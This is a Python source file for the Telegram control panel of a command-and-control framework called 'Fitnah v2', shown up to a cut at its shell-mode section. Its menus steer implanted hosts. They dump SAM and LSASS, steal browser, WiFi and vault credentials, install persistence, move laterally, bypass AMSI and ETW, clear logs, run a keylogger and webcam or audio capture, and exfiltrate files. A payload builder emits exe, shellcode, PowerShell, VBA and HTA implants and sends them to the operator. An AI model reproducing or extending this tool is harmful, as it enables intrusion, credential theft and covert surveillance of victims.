"""
Telegram inline keyboard UI — the operator's full control panel.

Every operator action flows through inline keyboards.
Menus edit in-place (one message, no spam).
Only results and output create new messages.

Callback data convention:
    <action>                    — no agent context (main, sessions, loot, status)
    <action>:<agent_id>         — agent-scoped (agent:abc, recon:abc, shell:abc)
    <action>:<agent_id>:<extra> — parameterised (plugin:abc:dump_sam)
"""
from __future__ import annotations

import asyncio
import base64 as _base64
import io as _io
import logging
import os.path as _osp
import time
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import TYPE_CHECKING, Callable

from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.error import TelegramError
from telegram.ext import ContextTypes

if TYPE_CHECKING:
    from fitnah.c2.router import Router
    from fitnah.c2.server import C2Server
    from fitnah.orchestration.session_manager import SessionManager
    from fitnah.orchestration.audit_log import AuditLog
    from fitnah.loot.store import LootStore

log = logging.getLogger(__name__)

# ── Operator input state machine ──────────────────────────────────────────────

class InputMode(str, Enum):
    IDLE              = "idle"
    SHELL_CMD         = "shell_cmd"         # waiting for shell command text
    DOWNLOAD_PATH     = "download_path"     # waiting for remote file path
    UPLOAD_FILE       = "upload_file"       # waiting for file upload
    UPLOAD_CONFIRM    = "upload_confirm"    # operator sent a file, waiting target confirm
    AUDIO_SECONDS     = "audio_seconds"     # waiting for /audio <seconds> input


@dataclass
class OperatorState:
    mode:       InputMode = InputMode.IDLE
    agent_id:   str       = ""
    menu_msg_id: int      = 0           # message ID to edit in-place
    extra:      dict      = field(default_factory=dict)


# ── Menu builders ─────────────────────────────────────────────────────────────

def _btn(text: str, data: str) -> InlineKeyboardButton:
    return InlineKeyboardButton(text, callback_data=data)

def _kb(*rows: list[InlineKeyboardButton]) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(list(rows))

def _back(target: str = "main") -> list[InlineKeyboardButton]:
    return [_btn("◀ Back", target)]


def build_main_menu(alive: int, transport: str) -> tuple[str, InlineKeyboardMarkup]:
    text = (
        "<b>🔴 Fitnah v2</b>\n"
        "─────────────────────\n"
        f"Active agents : <b>{alive}</b>\n"
        f"Transport     : <b>{transport}</b>\n"
    )
    kb = _kb(
        [_btn("📡 Sessions", "sessions"),  _btn("💾 Loot",     "loot")],
        [_btn("🔨 Builder",  "builder"),   _btn("📊 Status",   "status")],
        [_btn("📶 Listeners","listeners")],
    )
    return text, kb


def build_sessions_menu(sessions: list) -> tuple[str, InlineKeyboardMarkup]:
    if not sessions:
        text = "<b>Sessions</b>\n\nNo active agents."
        kb   = _kb(_back())
        return text, kb

    text = f"<b>Sessions</b>  ({len(sessions)} alive)\n─────────────────────\n"
    rows = []
    for s in sessions:
        label = f"{'★' if s.priv_level == 'system' else '▲' if s.priv_level == 'admin' else '●'} {s.hostname} • {s.priv_level}"
        rows.append([_btn(label, f"agent:{s.agent_id}")])
    rows.append(_back())
    return text, _kb(*rows)


def build_agent_menu(session) -> tuple[str, InlineKeyboardMarkup]:
    age  = session.age()
    text = (
        f"<b>{session.hostname}</b>\n"
        "─────────────────────\n"
        f"Agent   : <code>{session.agent_id}</code>\n"
        f"User    : <code>{session.username}</code>\n"
        f"OS      : {session.os} ({session.arch})\n"
        f"Priv    : <b>{session.priv_level}</b>\n"
        f"IP      : <code>{session.ip}</code>\n"
        f"Transport: {session.transport}\n"
        f"Last seen: {age}s ago\n"
    )
    aid = session.agent_id
    kb  = _kb(
        [_btn("💻 Shell",      f"shell:{aid}"),    _btn("🔍 Recon",     f"recon:{aid}")],
        [_btn("🔑 Credentials",f"creds:{aid}"),    _btn("📁 Files",     f"files:{aid}")],
        [_btn("🔒 Persist",    f"persist:{aid}"),  _btn("🌐 Pivot",     f"pivot:{aid}")],
        [_btn("🛡 Evasion",    f"evasion:{aid}"),  _btn("📦 Collect",   f"collect:{aid}")],
        [_btn("📤 Exfil",      f"exfil:{aid}"),    _btn("📜 History",   f"history:{aid}")],
        [_btn("💀 Kill",       f"kill:{aid}"),      _btn("🔄 Refresh",   f"agent:{aid}")],
        _back("sessions"),
    )
    return text, kb


def build_recon_menu(agent_id: str) -> tuple[str, InlineKeyboardMarkup]:
    aid = agent_id
    kb  = _kb(
        [_btn("💻 Sysinfo",     f"plugin:{aid}:sysinfo"),
         _btn("📸 Screenshot",  f"plugin:{aid}:screenshot")],
        [_btn("⚙ Processes",    f"plugin:{aid}:processes"),
         _btn("🌐 Network Info",f"plugin:{aid}:network_info")],
        [_btn("🔎 ARP Scan",    f"plugin:{aid}:arp_scan"),
         _btn("🌍 DNS Enum",    f"plugin:{aid}:dns_enum")],
        [_btn("📂 Shares",      f"plugin:{aid}:shares_enum"),
         _btn("👥 Users",       f"plugin:{aid}:users_enum")],
        _back(f"agent:{aid}"),
    )
    return "<b>Recon</b>\nChoose a module:", kb


def build_creds_menu(agent_id: str) -> tuple[str, InlineKeyboardMarkup]:
    aid = agent_id
    kb  = _kb(
        [_btn("🗄 Dump SAM",    f"plugin:{aid}:dump_sam"),
         _btn("🧠 LSASS Dump",  f"plugin:{aid}:lsass_dump")],
        [_btn("🌐 Browser Creds",f"plugin:{aid}:browser_creds"),
         _btn("📶 WiFi Creds",  f"plugin:{aid}:wifi_creds")],
        [_btn("🔐 Vault Creds", f"plugin:{aid}:vault_creds"),
         _btn("📋 Clipboard",   f"plugin:{aid}:clipboard")],
        _back(f"agent:{aid}"),
    )
    return "<b>Credentials</b>\nChoose a module:", kb


def build_files_menu(agent_id: str) -> tuple[str, InlineKeyboardMarkup]:
    aid = agent_id
    kb  = _kb(
        [_btn("📂 List Dir",   f"plugin:{aid}:dir_list"),
         _btn("🔍 File Search",f"plugin:{aid}:file_search")],
        [_btn("⬇ Download",   f"download:{aid}"),
         _btn("⬆ Upload",     f"upload:{aid}")],
        _back(f"agent:{aid}"),
    )
    return "<b>Files</b>\nChoose an action:", kb


def build_persist_menu(agent_id: str) -> tuple[str, InlineKeyboardMarkup]:
    aid = agent_id
    kb  = _kb(
        [_btn("🗝 Registry Run",   f"plugin:{aid}:registry_run"),
         _btn("⏰ Sched Task",     f"plugin:{aid}:scheduled_task")],
        [_btn("📁 Startup Folder", f"plugin:{aid}:startup_folder"),
         _btn("⚡ WMI Subscribe",  f"plugin:{aid}:wmi_subscribe")],
        _back(f"agent:{aid}"),
    )
    return "<b>Persistence</b>\nChoose a module:", kb


def build_pivot_menu(agent_id: str) -> tuple[str, InlineKeyboardMarkup]:
    aid = agent_id
    kb  = _kb(
        [_btn("🖥 PsExec",     f"plugin:{aid}:psexec"),
         _btn("⚙ WMI Exec",   f"plugin:{aid}:wmi_exec")],
        [_btn("📤 SMB Upload", f"plugin:{aid}:smb_upload"),
         _btn("🖥 Enable RDP", f"plugin:{aid}:rdp_enable")],
        _back(f"agent:{aid}"),
    )
    return "<b>Lateral Movement</b>\nChoose a module:", kb


def build_evasion_menu(agent_id: str) -> tuple[str, InlineKeyboardMarkup]:
    aid = agent_id
    kb  = _kb(
        [_btn("🚫 AMSI Bypass",    f"plugin:{aid}:amsi_bypass"),
         _btn("👁 ETW Patch",      f"plugin:{aid}:etw_patch")],
        [_btn("🛡 Defender Excl.", f"plugin:{aid}:defender_exclude"),
         _btn("🗑 Clear Logs",     f"plugin:{aid}:clear_logs")],
        _back(f"agent:{aid}"),
    )
    return "<b>Defense Evasion</b>\nChoose a module:", kb


def build_collect_menu(agent_id: str) -> tuple[str, InlineKeyboardMarkup]:
    aid = agent_id
    kb  = _kb(
        [_btn("⌨ Keylogger",    f"plugin:{aid}:keylogger"),
         _btn("📸 Screenshot",  f"plugin:{aid}:screenshot")],
        [_btn("📧 Email Harvest",f"plugin:{aid}:email_harvest"),
         _btn("📂 Dir List",    f"plugin:{aid}:dir_list")],
        _back(f"agent:{aid}"),
    )
    return "<b>Collection</b>\nChoose a module:", kb


def build_exfil_menu(agent_id: str) -> tuple[str, InlineKeyboardMarkup]:
    aid = agent_id
    kb  = _kb(
        [_btn("📤 Upload File",  f"plugin:{aid}:upload_file"),
         _btn("🗜 Zip & Exfil", f"plugin:{aid}:zip_exfil")],
        [_btn("📦 Chunked Send", f"plugin:{aid}:chunked_send")],
        _back(f"agent:{aid}"),
    )
    return "<b>Exfiltration</b>\nChoose a module:", kb


def build_loot_menu(counts: dict) -> tuple[str, InlineKeyboardMarkup]:
    text = (
        "<b>💾 Loot Store</b>\n"
        "─────────────────────\n"
        f"Credentials : {counts.get('credential', 0)}\n"
        f"Files       : {counts.get('file', 0)}\n"
        f"Screenshots : {counts.get('screenshot', 0)}\n"
        f"Generic     : {counts.get('generic', 0)}\n"
    )
    kb = _kb(
        [_btn("🔑 Credentials", "loot:credential"),
         _btn("📁 Files",       "loot:file")],
        [_btn("📸 Screenshots", "loot:screenshot"),
         _btn("📦 All",         "loot:all")],
        [_btn("📤 Export",      "loot:export")],
        _back(),
    )
    return text, kb


def build_status_menu(
    router_status: str, c2_stats: dict, session_count: int, alive_count: int
) -> tuple[str, InlineKeyboardMarkup]:
    text = (
        "<b>📊 Server Status</b>\n"
        "─────────────────────\n"
        f"{router_status}\n\n"
        f"Sessions  : {alive_count}/{session_count}\n"
        f"Dispatched: {c2_stats.get('dispatched', 0)}\n"
        f"ACKed     : {c2_stats.get('acked', 0)}\n"
        f"Timeouts  : {c2_stats.get('timed_out', 0)}\n"
        f"Pending   : {c2_stats.get('pending', 0)}\n"
    )
    kb = _kb(
        [_btn("🔄 Refresh", "status")],
        _back(),
    )
    return text, kb


def build_listeners_menu(router_status: str) -> tuple[str, InlineKeyboardMarkup]:
    text = f"<b>📶 Transports</b>\n─────────────────────\n{router_status}"
    kb   = _kb(
        [_btn("⚡ Force Discord", "listener:discord"),
         _btn("↩ Recover TG",    "listener:telegram")],
        [_btn("🔄 Refresh", "listeners")],
        _back(),
    )
    return text, kb


def build_kill_confirm_menu(agent_id: str, hostname: str) -> tuple[str, InlineKeyboardMarkup]:
    text = (
        f"⚠️ <b>Kill Agent?</b>\n\n"
        f"Host : {hostname}\n"
        f"ID   : <code>{agent_id}</code>\n\n"
        "This will send a <b>die</b> command to the implant."
    )
    kb = _kb(
        [_btn("✅ Confirm Kill", f"kill_confirm:{agent_id}"),
         _btn("❌ Cancel",       f"agent:{agent_id}")],
    )
    return text, kb


def build_history_text(session, entries: list[dict]) -> str:
    lines = [
        f"<b>📜 History — {session.hostname}</b>\n"
        "─────────────────────\n"
    ]
    if not entries:
        lines.append("No actions recorded yet.")
    else:
        for e in entries:
            result_icon = "✅" if e.get("result") == "ok" else "❌"
            lines.append(f"{e['time']}  {result_icon}  {e['action']}")
    return "\n".join(lines)


def build_shell_prompt(hostname: str) -> tuple[str, InlineKeyboardMarkup]:
    text = (
        f"<b>💻 Shell — {hostname}</b>\n\n"
        "Type your command in the next message.\n"
        "<i>Send /cancel to abort.</i>"
    )
    kb = _kb([_btn("❌ Cancel", f"main")])
    return text, kb


def build_download_prompt(hostname: str) -> tuple[str, InlineKeyboardMarkup]:
    text = (
        f"<b>⬇ Download — {hostname}</b>\n\n"
        "Enter the full remote file path:\n"
        "<code>C:\\Users\\victim\\secret.txt</code>"
    )
    kb = _kb([_btn("❌ Cancel", "main")])
    return text, kb


def build_builder_menu(fmt: str = "exe", arch: str = "x64",
                       enc: str = "none", sleep: int = 10,
                       jitter: int = 20) -> tuple[str, InlineKeyboardMarkup]:
    fmt_icon  = {"exe": "🖥", "shellcode": "💉", "ps1": "📜", "vba": "📄", "hta": "🌐"}.get(fmt, "📦")
    enc_icon  = {"none": "🔓", "xor": "🔐", "aes-256-gcm": "🔒"}.get(enc, "🔓")
    text = (
        f"<b>🔨 Payload Builder</b>\n"
        f"──────────────────────────\n"
        f"Format   : {fmt_icon} <b>{fmt.upper()}</b>\n"
        f"Arch     : <b>{arch}</b>\n"
        f"Encrypt  : {enc_icon} <b>{enc}</b>\n"
        f"Sleep    : <b>{sleep}s</b>  Jitter: <b>{jitter}%</b>\n\n"
        f"Tap options to change, then tap <b>Build</b>."
    )
    kb = _kb(
        [_btn(f"{fmt_icon} Format: {fmt.upper()}", f"bld_fmt:{fmt}"),
         _btn(f"🏗 Arch: {arch}", f"bld_arch:{arch}")],
        [_btn(f"{enc_icon} Encrypt: {enc}", f"bld_enc:{enc}"),
         _btn(f"⏱ Sleep: {sleep}s", f"bld_sleep:{sleep}")],
        [_btn(f"🎲 Jitter: {jitter}%", f"bld_jitter:{jitter}"),
         _btn("🔨 BUILD NOW", f"bld_run:{fmt}:{arch}:{enc}:{sleep}:{jitter}")],
        _back(),
    )
    return text, kb


def _next_fmt(fmt: str) -> str:
    opts = ["exe", "shellcode", "ps1", "vba", "hta"]
    return opts[(opts.index(fmt) + 1) % len(opts)] if fmt in opts else "exe"

def _next_arch(arch: str) -> str:
    return "x86" if arch == "x64" else "x64"

def _next_enc(enc: str) -> str:
    opts = ["none", "xor", "aes-256-gcm"]
    return opts[(opts.index(enc) + 1) % len(opts)] if enc in opts else "none"

def _next_sleep(sleep: int) -> int:
    opts = [5, 10, 15, 30, 60]
    return opts[(opts.index(sleep) + 1) % len(opts)] if sleep in opts else 10

def _next_jitter(jitter: int) -> int:
    opts = [0, 10, 20, 30, 50]
    return opts[(opts.index(jitter) + 1) % len(opts)] if jitter in opts else 20


# ── Main UI class ─────────────────────────────────────────────────────────────

class TelegramUI:
    """
    Manages all inline keyboard menus, operator state, and callback routing.

    Injected into TelegramTransport as the on_callback handler.
    Also processes incoming operator text messages (shell input etc.)
    """

    def __init__(
        self,
        sessions: "SessionManager",
        c2: "C2Server",
        router: "Router",
        audit: "AuditLog",
        loot: "LootStore",
        operator_chat_id: int,
        operator_tag: str = "operator",
        on_new_agent: Callable | None = None,
        on_plugin_run: Callable | None = None,
        on_builder_run: Callable | None = None,
    ):
        self._sessions         = sessions
        self._c2               = c2
        self._router           = router
        self._audit            = audit
        self._loot             = loot
        self._operator_id      = operator_chat_id
        self._operator_tag     = operator_tag
        self._on_new_agent     = on_new_agent
        self._on_plugin_run    = on_plugin_run    # async(agent_id, plugin_name, params) -> ModuleResult
        self._on_builder_run   = on_builder_run   # async(fmt, arch, enc, sleep, jitter) -> BuildResult
        self._list_plugins: Callable | None = None  # sync(category="") -> list[dict]

        # per-chat operator state (supports future multi-op)
        self._states: dict[int, OperatorState] = {}

    # ── entry points ──────────────────────────────────────────────────────
    async def handle_callback(self, update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
        """Called by TelegramTransport for every inline keyboard button press."""
        query = update.callback_query
        if not query:
            return
        await query.answer()

        data    = query.data or ""
        chat_id = str(query.message.chat_id)
        msg_id  = query.message.message_id

        log.info("[ui] callback: %r  chat=%s", data, chat_id)

        try:
            await self._route_callback(data, chat_id, msg_id, query)
        except TelegramError as exc:
            log.warning("[ui] telegram error in callback: %s", exc)
        except Exception as exc:
            log.exception("[ui] unhandled error in callback: %s", exc)

    async def handle_text(self, chat_id: str, sender_id: int, text: str, bot) -> bool:
        """
        Handle operator text input. Called by kernel before routing to C2.
        Returns True if the message was consumed (don't forward to C2).
        """
        state = self._states.get(sender_id)

        # ── slash command dispatch (no state required) ─────────────────────
        stripped = text.strip()
        lower    = stripped.lower()

        if not state or state.mode == InputMode.IDLE:
            if lower in ("/start", "start"):
                log.info("[ui] sending main menu to chat=%s", chat_id)
                try:
                    await self._send_main_menu(bot, chat_id)
                except Exception as exc:
                    log.exception("[ui] FAILED to send main menu: %s", exc)
                return True

            if lower.startswith("/download "):
                remote = stripped[len("/download "):].strip()
                if state and state.agent_id:
                    await self._execute_download(bot, chat_id, sender_id, state.agent_id, remote)
                else:
                    await bot.send_message(chat_id=int(chat_id),
                                           text="No active agent. Select one first.")
                return True

            if lower.startswith("/upload"):
                # /upload  — handled by document handler; just ACK here
                await bot.send_message(
                    chat_id=int(chat_id),
                    text="Send a file (document) to upload it to the active agent.",
                    parse_mode="HTML",
                )
                return True

            if lower.startswith("/audio"):
                parts = stripped.split()
                secs  = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 10
                if state and state.agent_id:
                    await self._run_audio(bot, chat_id, state.agent_id, secs)
                else:
                    await bot.send_message(chat_id=int(chat_id), text="No active agent selected.")
                return True

            if lower.startswith("/webcam"):
                if state and state.agent_id:
                    await self._run_webcam(bot, chat_id, state.agent_id)
                else:
                    await bot.send_message(chat_id=int(chat_id), text="No active agent selected.")
                return True

            if lower.startswith("/screenshot"):
                parts    = stripped.split()
                agent_id = parts[1] if len(parts) > 1 else (state.agent_id if state else "")
                if agent_id:
                    await self._run_screenshot_cmd(bot, chat_id, agent_id)
                else:
                    await bot.send_message(chat_id=int(chat_id), text="Usage: /screenshot <agent_id>")
                return True

            if lower.startswith("/plugins"):
                parts    = stripped.split()
                category = parts[1] if len(parts) > 1 else ""
                await self._show_plugins_list(bot, chat_id, category)
                return True

            return False

        if lower in ("/cancel", "cancel"):
            self._clear_state(sender_id)
            await self._send_main_menu(bot, chat_id)
            return True

        if state.mode == InputMode.SHELL_CMD:
            await self._execute_shell(bot, chat_id, sender_id, state.agent_id, text)
            return True

        if state.mode == InputMode.DOWNLOAD_PATH:
            await self._execute_download(bot, chat_id, sender_id, state.agent_id, text)
            return True

        if state.mode == InputMode.UPLOAD_CONFIRM:
            # Operator typed the target path after uploading a file
            remote_path = text.strip()
            staged      = state.extra.get("staged_path", "")
            if staged and remote_path:
                await self._do_upload_to_agent(bot, chat_id, sender_id,
                                               state.agent_id, staged, remote_path)
            else:
                await bot.send_message(chat_id=int(chat_id), text="Upload cancelled — no staged file.")
                self._clear_state(sender_id)
            return True

        return False

    async def handle_document(self, chat_id: str, sender_id: int, file_id: str,
                               file_name: str, bot) -> None:
        """
        Called when operator sends a document (file) to the bot.
        Saves to staging area and prompts for target agent + remote path.
        """
        staging_dir = Path("data/staging")
        staging_dir.mkdir(parents=True, exist_ok=True)
        staged_path = staging_dir / file_name

        try:
            tg_file = await bot.get_file(file_id)
            await tg_file.download_to_drive(str(staged_path))
        except Exception as exc:
            await bot.send_message(
                chat_id=int(chat_id),
                text=f"Failed to save file: {exc}",
            )
            return

        # Determine active agent
        state    = self._states.get(sender_id)
        agent_id = state.agent_id if state else ""

        if not agent_id:
            sessions = self._sessions.alive()
            if sessions:
                agent_id = sessions[0].agent_id
            else:
                await bot.send_message(
                    chat_id=int(chat_id),
                    text="File staged. No active agent found. Select an agent first.",
                )
                return

        session = self._sessions.get(agent_id)
        hostname = session.hostname if session else agent_id

        # Set state to UPLOAD_CONFIRM so next text message = remote path
        self._states[sender_id] = OperatorState(
            mode=InputMode.UPLOAD_CONFIRM,
            agent_id=agent_id,
            extra={"staged_path": str(staged_path)},
        )

        await bot.send_message(
            chat_id=int(chat_id),
            text=(
                f"File staged: <code>{file_name}</code> ({staged_path.stat().st_size:,} bytes)\n"
                f"Target agent: <b>{hostname}</b> (<code>{agent_id}</code>)\n\n"
                "Reply with the <b>remote path</b> to upload to:\n"
                "<code>C:\\Windows\\Temp\\file.exe</code>"
            ),
            parse_mode="HTML",
        )

    # ── new agent notification ────────────────────────────────────────────
    async def notify_new_agent(self, session, bot) -> None:
        """Send new-agent checkin notification to the operator."""
        text = (
            "🆕 <b>New Agent</b>\n"
            "─────────────────────\n"
            f"Host      : <b>{session.hostname}</b>\n"
            f"User      : <code>{session.username}</code>\n"
            f"OS        : {session.os} ({session.arch})\n"
            f"Privilege : <b>{session.priv_level}</b>\n"
            f"IP        : <code>{session.ip}</code>\n"
            f"Transport : {session.transport}\n"
            f"Agent ID  : <code>{session.agent_id}</code>\n"
        )
        aid = session.agent_id
        kb  = _kb(
            [_btn("💻 Shell",    f"shell:{aid}"),
             _btn("🔍 Recon",   f"recon:{aid}")],
            [_btn("🔑 Creds",   f"creds:{aid}"),
             _btn("📁 Files",   f"files:{aid}")],
            [_btn("📋 Details", f"agent:{aid}")],
        )
        try:
            await bot.send_message(
                chat_id=self._operator_id,
                text=text,
                parse_mode="HTML",
                reply_markup=kb,
            )
        except TelegramError as exc:
            log.warning("[ui] failed to send new-agent notification: %s", exc)

    async def notify_agent_stale(self, session, bot) -> None:
        text = (
            f"⚠️ <b>Agent Stale</b>\n\n"
            f"Host : {session.hostname}\n"
            f"ID   : <code>{session.agent_id}</code>\n"
            f"Last seen {session.age()}s ago"
        )
        try:
            await bot.send_message(
                chat_id=self._operator_id,
                text=text,
                parse_mode="HTML",
            )
        except TelegramError as exc:
            log.warning("[telegram_ui] failed to notify agent exit: %s", exc)

    async def notify_transport_event(self, event: str, from_t: str, to_t: str, bot) -> None:
        icons = {"telegram": "📱", "discord": "💬"}
        text  = (
            f"📶 <b>Transport {event}</b>\n\n"
            f"{icons.get(from_t,'?')} {from_t} → {icons.get(to_t,'?')} {to_t}"
        )
        try:
            await bot.send_message(
                chat_id=self._operator_id,
                text=text,
                parse_mode="HTML",
            )
        except TelegramError as exc:
            log.warning("[telegram_ui] failed to notify transport event: %s", exc)

    # ── callback router ───────────────────────────────────────────────────
    async def _route_callback(
        self, data: str, chat_id: str, msg_id: int, query
    ) -> None:
        bot = query.get_bot()

        # ── top-level ─────────────────────────────────────────────────────
        if data == "main":
            await self._edit_main_menu(query)
            return

        if data == "sessions":
            await self._edit_sessions(query)
            return

        if data == "loot":
            await self._edit_loot(query)
            return

        if data == "status":
            await self._edit_status(query)
            return

        if data == "listeners":
            await self._edit_listeners(query)
            return

        if data == "builder":
            text, kb = build_builder_menu()
            await _edit(query, text, kb)
            return

        # ── parameterised ─────────────────────────────────────────────────
        parts  = data.split(":", 2)
        action = parts[0]
        arg1   = parts[1] if len(parts) > 1 else ""
        arg2   = parts[2] if len(parts) > 2 else ""

        # agent detail menu
        if action == "agent":
            await self._edit_agent_menu(query, arg1)

        # submenus
        elif action == "recon":
            text, kb = build_recon_menu(arg1)
            await _edit(query, text, kb)

        elif action == "creds":
            text, kb = build_creds_menu(arg1)
            await _edit(query, text, kb)

        elif action == "files":
            text, kb = build_files_menu(arg1)
            await _edit(query, text, kb)

        elif action == "persist":
            text, kb = build_persist_menu(arg1)
            await _edit(query, text, kb)

        elif action == "pivot":
            text, kb = build_pivot_menu(arg1)
            await _edit(query, text, kb)

        elif action == "evasion":
            text, kb = build_evasion_menu(arg1)
            await _edit(query, text, kb)

        elif action == "collect":
            text, kb = build_collect_menu(arg1)
            await _edit(query, text, kb)

        elif action == "exfil":
            text, kb = build_exfil_menu(arg1)
            await _edit(query, text, kb)

        # plugin execution
        elif action == "plugin":
            await self._run_plugin(query, bot, agent_id=arg1, plugin_name=arg2)

        # shell input mode
        elif action == "shell":
            await self._enter_shell_mode(query, bot, agent_id=arg1)

        # file download input mode
        elif action == "download":
            await self._enter_download_mode(query, bot, agent_id=arg1)

        # history
        elif action == "history":
            await self._show_history(query, agent_id=arg1)

        # kill confirmation
        elif action == "kill":
            session = self._sessions.get(arg1)
            if session:
                text, kb = build_kill_confirm_menu(arg1, session.hostname)
                await _edit(query, text, kb)

        elif action == "kill_confirm":
            await self._execute_kill(query, bot, agent_id=arg1)

        # loot category
        elif action == "loot":
            await self._show_loot_items(query, kind=arg1)

        # listener control
        elif action == "listener":
            await self._control_listener(query, transport=arg1)

        # ── builder toggle buttons ────────────────────────────────────────
        elif action == "bld_fmt":
            state = self._builder_state(query.message.chat_id)
            state["fmt"] = _next_fmt(arg1)
            text, kb = build_builder_menu(**state)
            await _edit(query, text, kb)

        elif action == "bld_arch":
            state = self._builder_state(query.message.chat_id)
            state["arch"] = _next_arch(arg1)
            text, kb = build_builder_menu(**state)
            await _edit(query, text, kb)

        elif action == "bld_enc":
            state = self._builder_state(query.message.chat_id)
            state["enc"] = _next_enc(arg1)
            text, kb = build_builder_menu(**state)
            await _edit(query, text, kb)

        elif action == "bld_sleep":
            state = self._builder_state(query.message.chat_id)
            state["sleep"] = _next_sleep(int(arg1))
            text, kb = build_builder_menu(**state)
            await _edit(query, text, kb)

        elif action == "bld_jitter":
            state = self._builder_state(query.message.chat_id)
            state["jitter"] = _next_jitter(int(arg1))
            text, kb = build_builder_menu(**state)
            await _edit(query, text, kb)

        elif action == "bld_run":
            # data: bld_run:<fmt>:<arch>:<enc>:<sleep>:<jitter>
            bld_parts = data.split(":")
            if len(bld_parts) >= 6:
                bfmt, barch, benc = bld_parts[1], bld_parts[2], bld_parts[3]
                bsleep  = int(bld_parts[4])
                bjitter = int(bld_parts[5])
            else:
                bfmt, barch, benc, bsleep, bjitter = "exe", "x64", "none", 10, 20
            await self._run_build(query, bot, fmt=bfmt, arch=barch, enc=benc,
                                  sleep=bsleep, jitter=bjitter)

        else:
            log.warning("[ui] unknown callback action: %r", action)

    # ── menu edit helpers ─────────────────────────────────────────────────
    async def _edit_main_menu(self, query) -> None:
        alive     = len(self._sessions.alive())
        transport = self._router.active_transport
        text, kb  = build_main_menu(alive, transport)
        await _edit(query, text, kb)

    async def _edit_sessions(self, query) -> None:
        sessions = self._sessions.alive()
        text, kb = build_sessions_menu(sessions)
        await _edit(query, text, kb)

    async def _edit_agent_menu(self, query, agent_id: str) -> None:
        session = self._sessions.get(agent_id)
        if not session:
            await _edit(query, "⚠️ Session not found.", _kb(_back("sessions")))
            return
        text, kb = build_agent_menu(session)
        await _edit(query, text, kb)

    async def _edit_loot(self, query) -> None:
        counts = self._loot.counts()
        text, kb = build_loot_menu(counts)
        await _edit(query, text, kb)

    async def _edit_status(self, query) -> None:
        r_status = self._router.status_table()
        c2_stats = self._c2.stats()
        c2_stats["pending"] = len(self._c2.pending_tasks())
        text, kb = build_status_menu(
            r_status, c2_stats,
            self._sessions.count(),
            len(self._sessions.alive()),
        )
        await _edit(query, text, kb)

    async def _edit_listeners(self, query) -> None:
        text, kb = build_listeners_menu(self._router.status_table())
        await _edit(query, text, kb)

    async def _send_main_menu(self, bot, chat_id: str) -> None:
        alive     = len(self._sessions.alive())
        transport = self._router.active_transport
        text, kb  = build_main_menu(alive, transport)
        await bot.send_message(
            chat_id=int(chat_id), text=text,
            parse_mode="HTML", reply_markup=kb,
        )

    # ── builder state (per chat) ──────────────────────────────────────────
    _builder_states: dict[int, dict] = {}

    def _builder_state(self, chat_id: int) -> dict:
        if chat_id not in self._builder_states:
            self._builder_states[chat_id] = {"fmt": "exe", "arch": "x64", "enc": "none", "sleep": 10, "jitter": 20}
        return self._builder_states[chat_id]

    async def _run_build(self, query, bot, fmt: str, arch: str, enc: str,
                         sleep: int, jitter: int) -> None:
        await _answer(query)
        await _edit(query, f"⚙️ Building `{fmt.upper()}` ({arch}, enc={enc})…\n_Please wait…_",
                    _kb(_back("builder")))
        if not self._on_builder_run:
            await _edit(query, "❌ Builder not configured.", _kb(_back("builder")))
            return
        try:
            result = await self._on_builder_run(fmt=fmt, arch=arch, enc=enc,
                                                 sleep=sleep, jitter=jitter)
        except Exception as exc:
            await _edit(query, f"❌ Builder error:\n`{exc}`", _kb(_back("builder")))
            return

        if not result.ok:
            log_lines = "\n".join((result.build_log or [])[-10:])
            await _edit(query,
                        f"❌ Build failed:\n`{result.error}`\n\n```\n{log_lines}\n```",
                        _kb(_back("builder")))
            return

        # send the artifact as a document
        path = result.path
        caption = (
            f"✅ Build complete\n"
            f"Format: `{fmt}` | Arch: `{arch}` | Enc: `{enc}`\n"
            f"Size: `{path.stat().st_size // 1024} KB`"
        )
        try:
            with open(path, "rb") as fh:
                await bot.send_document(
                    chat_id=self._operator_id,
                    document=fh,
                    filename=path.name,
                    caption=caption,
                    parse_mode="Markdown",
                )
            await _edit(query, f"✅ `{path.name}` sent above.",
                        _kb(_back("builder")))
        except Exception as exc:
            await _edit(query, f"⚠️ Built OK but send failed:\n`{exc}`",
                        _kb(_back("builder")))

    # ── plugin execution ──────────────────────────────────────────────────
    async def _run_plugin(self, query, bot, agent_id: str, plugin_name: str) -> None:
        session = self._sessions.get(agent_id)
        if not session:
            await query.answer("Session not found.", show_alert=True)
            return

        # Show "running" indicator in the menu message
        await _edit(
            query,
            f"⏳ <b>Running {plugin_name}</b> on <code>{session.hostname}</code>...",
            _kb([_btn("⌛ Please wait...", "noop")]),
        )

        # Run plugin via kernel.execute() — plugin logic runs on C2 side,
        # which uses ctx.exec() → shell command → implant
        screenshot_bytes: bytes | None = None
        if self._on_plugin_run:
            mr = await self._on_plugin_run(agent_id, plugin_name, {})
            status = mr.status.value
            if status == "error":
                output = mr.error or "[error]"
            elif isinstance(mr.data, bytes):
                screenshot_bytes = mr.data
                output = f"[binary {len(mr.data)} bytes]"
            elif isinstance(mr.data, str):
                output = mr.data or f"[{status}]"
            elif mr.data is not None:
                import json as _json
                output = _json.dumps(mr.data, indent=2, default=str)
            else:
                output = f"[{status}]"
        else:
            raw = await self._c2.dispatch(
                agent_id=agent_id,
                chat_id=session.group_id or str(self._operator_id),
                command=plugin_name,
                args={},
            )
            status = raw.get("status", "?")
            output = raw.get("output", "") or f"[{status}]"

        self._audit.plugin_run(
            self._operator_tag, plugin_name, agent_id, {},
            status,
        )
        session.touch(plugin_name, status)

        # Send result as a new message (output is always a new message)
        icon    = "✅" if status == "ok" else "❌"
        header  = f"{icon} <b>{plugin_name}</b> @ <code>{session.hostname}</code>\n─────────────────────\n"

        for chunk in _chunk_text(header + _escape(output), 4096):
            await bot.send_message(
                chat_id=self._operator_id,
                text=chunk,
                parse_mode="HTML",
            )

        # auto-save screenshots to loot and send as photo
        if plugin_name == "screenshot" and status == "ok" and screenshot_bytes:
            self._loot.add(agent_id, "screenshot", f"screen_{int(time.time())}.png", screenshot_bytes)
            await bot.send_photo(
                chat_id=self._operator_id,
                photo=screenshot_bytes,
                caption=f"📸 {session.hostname}",
            )

        # Return to agent menu
        text, kb = build_agent_menu(session)
        await bot.send_message(
            chat_id=self._operator_id,
            text=text, parse_mode="HTML", reply_markup=kb,
        )

    # ── shell mode ────────────────────────────────────────────────────────
